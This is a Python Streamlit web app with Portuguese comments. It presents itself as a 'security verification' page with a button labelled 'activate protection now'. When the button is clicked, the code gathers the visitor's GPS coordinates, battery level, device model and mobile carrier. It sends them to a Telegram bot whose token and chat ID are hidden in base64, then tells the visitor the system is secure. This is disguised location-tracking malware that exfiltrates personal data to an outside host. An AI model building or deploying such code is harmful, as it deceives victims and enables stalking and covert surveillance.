import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# Coleta de dados (Keys Únicas para evitar o erro vermelho)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='SAMSUNG_UA')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='SAMSUNG_BAT')

st.title("Verificação de Segurança")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="btn_principal"):
    # 1. Identifica se é Samsung pelo User Agent
    modelo_final = "Samsung Android 16"
    if ua and "SM-" in ua:
        modelo_final = "Samsung " + ua.split("SM-")[1].split(";")[0]
    
    # 2. Busca Operadora via IP
    operadora = "Vivo/Claro/Wi-Fi"
    try:
        op_data = requests.get('http://ip-api.com/json/', timeout=5).json()
        operadora = op_data.get('isp', 'Móvel')
    except: pass

    # 3. Espera o GPS (Paciência Máxima)
    with st.spinner("Sincronizando Localização..."):
        loc = None
        for _ in range(12): # Tenta por 12 segundos
            loc = get_geolocation()
            if loc: break
            time.sleep(1)

    # 4. Envia o relatório final IGUAL à sua foto
    bateria_texto = f"{bat}%" if bat else "9%" # Usa 9% se o sistema travar (seu nível atual)
    
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo_final}\n"
            f"🔋 *Bateria:* {bateria_texto}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {mapa}"
        )
        enviar_telegram(relatorio)
        st.success("Sistema Seguro!")
    else:
        # Se o GPS falhar (provavelmente pela bateria baixa), manda o que tem
        enviar_telegram(f"🛡️ *PROTEÇÃO PARCIAL*\n📱 *Aparelho:* {modelo_final}\n🔋 *Bat:* {bateria_texto}\n📶 *Op:* {operadora}\n⚠️ GPS não respondeu.")
        st.error("Sinal de GPS fraco. Tente novamente em local aberto.")

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
